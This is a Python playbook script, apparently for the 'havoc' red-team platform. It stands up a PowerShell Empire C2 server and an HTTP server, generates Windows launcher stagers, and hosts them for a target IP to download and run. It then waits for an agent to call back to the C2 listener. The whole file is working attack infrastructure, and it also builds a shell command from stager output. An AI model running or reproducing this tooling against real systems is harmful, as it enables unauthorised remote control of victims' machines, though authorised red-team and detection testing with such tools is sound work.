# Import the supporting Python packages.
import re
import os
import ast
import string
import random
import pprint
import argparse
import subprocess
from configparser import ConfigParser
from datetime import datetime

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - C2 and HTTP Server')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the configuration file
config = ConfigParser()
config_file = os.path.expanduser('~/.havoc/config')
config.read(config_file)

# Get api_key and secret_key
if profile:
    api_key = config.get(profile, 'API_KEY')
    secret = config.get(profile, 'SECRET')
    api_region = config.get(profile, 'API_REGION')
    api_domain_name = config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = config.get('default', 'API_KEY')
    secret = config.get('default', 'SECRET')
    api_region = config.get('default', 'API_REGION')
    api_domain_name = config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Create a date string to use in the task name.
d = datetime.utcnow()
sdate = d.strftime('%m-%d-%Y-%H-%M')

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser()
config.read('havoc-playbooks/c2_and_http_server/c2_and_http_server.ini')

c2_listener_port = config.get('c2_task', 'listener_port')
c2_listener_tls = config.get('c2_task', 'listener_tls')
c2_domain_name = config.get('c2_task', 'domain_name')
c2_cert_subj = config.get('c2_task', 'cert_subj')
http_server_port = config.get('http_server_task', 'http_port')
http_server_tls = config.get('http_server_task', 'tls')
http_server_domain_name = config.get('http_server_task', 'domain_name')
http_server_cert_subj = config.get('http_server_task', 'cert_subj')

http_server_exists = None
agent_exists = None
c2_listener_exists = None
c2_task_exists = None
stager_exists = None


def clean_up():
    if http_server_exists:
        print(f'\nShutting down HTTP server task {http_server_exists}.\n')
        http_server_task_shutdown_response = h.task_shutdown(http_server_exists)
        if 'completed' not in http_server_task_shutdown_response:
            print(f'Task shutdown for {http_server_exists} failed.\n')
            print(http_server_task_shutdown_response)

    if agent_exists:
        print(f'\nSending kill command to agent with name {agent_exists[0]}.\n')
        instruct_instance = agent_exists[1]
        instruct_command = 'kill_agent'
        agent_name = agent_exists[0]
        instruct_args = {'Name': f'{agent_name}'}
        kill_agent_response = h.interact_with_task(agent_exists[2], instruct_command, instruct_instance, instruct_args)
        if 'outcome' in kill_agent_response and kill_agent_response['outcome'] == 'failed':
            print(f'Failed to kill agent with name {agent_exists[0]}.\n')
            print(kill_agent_response)

    if c2_task_exists:
        print(f'\nShutting down C2 task {c2_task_exists}.\n')
        c2_task_shutdown_response = h.task_shutdown(c2_task_exists)
        if 'completed' not in c2_task_shutdown_response:
            print(f'Task shutdown for {c2_task_exists} failed.\n')
            print(c2_task_shutdown_response)

    if stager_exists:
        print(f'\nDeleting the stager file {stager_exists} from the shared workspace.\n')
        h.delete_file(stager_exists)
        os.remove(stager_exists)

    if http_portgroup_exists:
        print(f'\nDeleting the {http_portgroup_exists} portgroup.\n')
        h.delete_portgroup(http_portgroup_exists)

    if c2_portgroup_exists:
        print(f'\nDeleting the {c2_portgroup_exists} portgroup.\n')
        h.delete_portgroup(c2_portgroup_exists)

    exit('\nDone... Exiting.\n')


# Get the public IP address where the C2 agent will be installed.
target_ip = input('\nPlease enter the public IP address that will download and run the C2 agent: ')

# Create a portgroup for the HTTP server task.
print(f'\nCreating a portgroup for the HTTP server.')
h.create_portgroup(f'http_server_{sdate}', f'Allows port {http_server_port} traffic')
print(f'\nAdding portgroup rule to allow C2 agent IP {target_ip} to reach port {http_server_port}.\n')
h.update_portgroup_rule(f'http_server_{sdate}', 'add', f'{target_ip}/32', http_server_port, 'tcp')
http_portgroup_exists = f'http_server_{sdate}'

# Create a portgroup for the powershell_empire task's listener.
print(f'\nCreating a portgroup for the C2 listener.')
h.create_portgroup(f'c2_server_{sdate}', f'Allows port {c2_listener_port} traffic')
print(f'\nAdding portgroup rule to allow C2 agent IP {target_ip} to reach the C2 listener on port {c2_listener_port}.\n')
h.update_portgroup_rule(f'c2_server_{sdate}', 'add', f'{target_ip}/32', c2_listener_port, 'tcp')
c2_portgroup_exists = f'c2_server_{sdate}'

# Launch an http_server task.
http_server_task_name = f'http_server_{sdate}'
portgroups = [f'http_server_{sdate}']
if http_server_domain_name == 'None':
    http_server_task_host_name = 'None'
else:
    http_server_task_host_name = 'www'
print(f'\nLaunching http_server task with name {http_server_task_name}.')
http_server_task = h.task_startup(
    http_server_task_name,
    'http_server',
    task_host_name=http_server_task_host_name,
    task_domain_name=http_server_domain_name,
    portgroups=portgroups
)
http_server_exists = http_server_task_name
http_server_task_ip = http_server_task['attack_ip']
print(f'\nThe http_server task is ready with the following parameters:')
print(f'IP - {http_server_task_ip}')
print(f'Host name - {http_server_task_host_name}')
print(f'Domain name - {http_server_domain_name}')

# Launch a powershell_empire task for the listener.
c2_task_name = f'c2_server_{sdate}'
portgroups = [f'c2_server_{sdate}']
if c2_domain_name == 'None':
    c2_task_host_name = 'None'
else:
    c2_task_host_name = 'c2'
print(f'\nLaunching powershell_empire task with name {c2_task_name}.')
c2_task = h.task_startup(
    c2_task_name,
    'powershell_empire',
    task_host_name=c2_task_host_name,
    task_domain_name=c2_domain_name,
    portgroups=portgroups
)
c2_task_exists = c2_task_name
c2_task_ip = c2_task['attack_ip']
print(f'\nThe powershell_empire task is ready with the following parameters:')
print(f'IP - {c2_task_ip}')
print(f'Host name - {c2_task_host_name}')
print(f'Domain name - {c2_domain_name}')

# Use a random string for the PowerShell Empire instruct_instance.
http_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# If TLS listener requested for http_server, generate a certificate.
if http_server_tls.lower() == 'true':
    print('\nGenerating a certificate to support a TLS web service.')
    subj = None
    if http_server_domain_name != 'None':
        subj = re.sub('\$HOST', f'www.{http_server_domain_name}', http_server_cert_subj)
    if http_server_domain_name == 'None':
        subj = re.sub('\$HOST', f'{http_server_task_ip}', http_server_cert_subj)
    instruct_command = 'cert_gen'
    instruct_args = {'subj': subj}
    cert_gen = h.interact_with_task(http_server_task_name, instruct_command, http_instruct_instance, instruct_args)
    if cert_gen['outcome'] == 'success':
        print('cert_gen succeeded.\n')
    else:
        print('cert_gen failed... Exiting.\n')
        clean_up()

# Ask the http_server task to start a web service.
print(f'\nStarting a web service on {http_server_task_name}.')
instruct_args = {'listen_port': int(http_server_port), 'ssl': http_server_tls}
instruct_command = 'start_server'
http_service = h.interact_with_task(http_server_task_name, instruct_command, http_instruct_instance, instruct_args)
if http_service['outcome'] == 'success':
    print('start_server succeeded.\n')
    http_service_exists = [http_server_task_name, http_instruct_instance]
else:
    print('start_server failed... Exiting.\n')
    clean_up()

# Use a random string for the PowerShell Empire instruct_instance.
c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# If TLS listener requested for powershell_empire listener, generate a certificate.
if c2_listener_tls.lower() == 'true':
    print('\nGenerating a certificate to support a TLS C2 listener.')
    subj = None
    if c2_domain_name != 'None':
        subj = re.sub('\$HOST', f'{c2_task_host_name}.{c2_domain_name}', c2_cert_subj)
    if c2_domain_name == 'None':
        subj = re.sub('\$HOST', f'{c2_task_ip}', c2_cert_subj)
    instruct_command = 'cert_gen'
    instruct_args = {'subj': subj}
    cert_gen = h.interact_with_task(c2_task_name, instruct_command, c2_instruct_instance, instruct_args)
    if cert_gen['outcome'] == 'success':
        print('cert_gen succeeded.\n')
    else:
        print('cert_gen failed... Exiting.\n')
        clean_up()

# Cycle through listener profiles for the powershell_empire task.
c2_listener_type = None
c2_listener_profile = None
while c2_listener_type != 'exit':
    c2_listener_type = input('Enter a C2 listener type or enter "exit" to initiate clean up: ')
    # Initiate clean up if "exit" entered as profile name.
    if c2_listener_type == 'exit':
        print('Received "exit" input. Initiating clean up...')
        clean_up()
    if c2_listener_type == 'http_malleable':
        c2_listener_profile = input('Enter a C2 profile name: ')

    # Check for an existing agent and kill it.
    if agent_exists:
        print(f'\nSending kill command to agent with name {agent_exists[0]}.\n')
        instruct_instance = agent_exists[1]
        instruct_command = 'kill_agent'
        instruct_args = {'Name': agent_exists[0]}
        kill_agent_response = h.interact_with_task(agent_exists[2], instruct_command, instruct_instance, instruct_args)
        if 'outcome' in kill_agent_response and kill_agent_response['outcome'] == 'failed':
            print(f'Failed to kill agent with name {agent_exists[0]}.\n')
            print(kill_agent_response)

    if stager_exists:
        print(f'\nDeleting the stager file {stager_exists} from the shared workspace.\n')
        h.delete_file(stager_exists)
        os.remove(stager_exists)

    # Check for an existing listener and kill it.
    if c2_listener_exists:
        print(f'\nKilling existing listener {c2_listener_exists[1]}.\n')
        instruct_command = 'kill_listener'
        instruct_args = {'Name': c2_listener_exists[1]}
        kill_listener_response = h.interact_with_task(
            c2_listener_exists[0], instruct_command, c2_instruct_instance, instruct_args
        )
        if 'outcome' in kill_listener_response and kill_listener_response['outcome'] == 'failed':
            print(f'Failed to kill listener {c2_listener_exists[1]}.\n')
            print(kill_listener_response)
            continue

    # Create a new listener.
    if c2_listener_profile:
        print(f'\nCreating an {c2_listener_type}:{c2_listener_profile} listener on {c2_task_name} task.')
    else:
        print(f'\nCreating an {c2_listener_type} listener on {c2_task_name} task.')
    if c2_listener_tls.lower() == 'true':
        c2_listener_protocol = 'https'
    else:
        c2_listener_protocol = 'http'
    if c2_domain_name != 'None':
        c2_listener_host = f'{c2_listener_protocol}://{c2_task_host_name}.{c2_domain_name}:{c2_listener_port}'
    else:
        c2_listener_host = f'{c2_listener_protocol}://{c2_task_ip}:{c2_listener_port}'
    instruct_command = 'create_listener'
    instruct_args = {
        'listener_type': f'{c2_listener_type}',
        'Name': f'{c2_listener_type}',
        'Host': c2_listener_host,
        'Port': c2_listener_port
    }
    if c2_listener_profile:
        instruct_args['Profile'] = f'{c2_listener_profile}.profile'
    if c2_listener_tls.lower() == 'true':
        instruct_args['CertPath'] = '/opt/Empire/empire/server/data/'
    create_listener = h.interact_with_task(c2_task_name, instruct_command, c2_instruct_instance, instruct_args)
    if create_listener['outcome'] == 'success':
        print('\ncreate_listener succeeded.\n')
        c2_listener_exists = [c2_task_name, c2_listener_type]
    else:
        print('\ncreate_listener failed with response:\n')
        print(create_listener)
        continue

    # Generate a stager for the listener.
    c2_stager = ast.literal_eval(
        input(
            'Enter a stager configuration in the form of a dictionary like the example below.\n'
            '{ "StagerName": "windows/launcher_bat", "Delete": "False", "OutFile": "launcher.bat" }\n'
            'Stager config: '
        )
    )
    print(f'\nGenerating a stager for the {c2_listener_type} listener.')
    instruct_command = 'create_stager'
    instruct_args = {
        'Listener': f'{c2_listener_type}'
    }
    for k, v in c2_stager.items():
        instruct_args[k] = v
    outfile = instruct_args['OutFile']
    stager_name = instruct_args['StagerName']
    create_stager = h.interact_with_task(c2_task_name, instruct_command, c2_instruct_instance, instruct_args)
    if create_stager['outcome'] == 'success':
        print('\ncreate_stager succeeded.\n')
    else:
        print('\ncreate_stager failed with response:\n')
        print(create_stager)
        continue
    output = create_stager['stager'][stager_name]['Output']
    subprocess.call(f'echo {output} | base64 -d > {outfile}', shell=True)

    # Upload the stager file to the shared workspace
    print('\nUploading the stager file to the shared workspace.')
    f = open(f'{outfile}', 'rb')
    raw_file = f.read()
    h.create_file(f'{outfile}', raw_file)
    stager_exists = f'{outfile}'

    # Use a random string for the http_server instruct_instance.
    http_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

    # Make sure there isn't an existing stager file with the same name on the http_server task.
    print(f'\nDeleting any existing {outfile} stager from http_server task {http_server_task_name}.')
    instruct_command = 'del'
    instruct_args = {'file_name': f'{outfile}'}
    delete_old_stager = h.interact_with_task(http_server_task_name, instruct_command, http_instruct_instance, instruct_args)
    if delete_old_stager['outcome'] == 'success':
        print('\nFile delete request succeeded.\n')
    else:
        print('\nNo existing file was present. Proceeding...\n')

    # Ask the http_server task to sync it's local workspace from the shared workspace.
    print(f'\nDownloading stager file from shared workspace to {http_server_task_name} task local workspace.')
    instruct_command = 'sync_from_workspace'
    http_sync = h.interact_with_task(http_server_task_name, instruct_command, http_instruct_instance)
    if http_sync['outcome'] == 'success':
        print('\nsync_from_workspace succeeded.\n')
    else:
        print('\nsync_from_workspace failed... Exiting.\n')
        clean_up()

    # Use a random string for the agent instruct_instance.
    agent_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

    if http_server_tls.lower() == 'true':
        protocol = 'https'
    else:
        protocol = 'http'
    if http_server_task_host_name == 'None':
        http_server_url = f'{protocol}://{http_server_task_ip}/{outfile}'
    else:
        http_server_url = f'{protocol}://www.{http_server_domain_name}/{outfile}'
    print(
        f'\nWaiting for an agent connection on task {c2_task_name}.\n'
        f'\nThe agent launcher can be downloaded from the HTTP server here:'
        f'\nHTTP server URL: {http_server_url}'
    )
    agent_name = None
    try:
        wait_for_c2_response = h.wait_for_c2(c2_task_name)
        agent_name = wait_for_c2_response['agent_info']['name']
        agent_exists = [agent_name, agent_instruct_instance, c2_task_name]
        print(f'Agent connected with name {agent_name}\n')
    except KeyboardInterrupt:
        print('Wait for agent operation interrupted. No agent connected.')
        continue

    print(
        '\nAn agent is connected. '
        f'\nC2 task name: {c2_task_name}'
        f'\nC2 IP address: {c2_task_ip}'
        f'\nC2 listener: {c2_listener_host}'
        f'\nAgent name: {agent_name}'
        '\n\nPlaybook will halt until prompted to proceed with next listener profile.'
        )
    print('\nPress enter to proceed.')
    input()

# Playbook is complete; time to clean up.
print('\nPlaybook operation completed. Cleaning up ./havoc resources.')
clean_up()
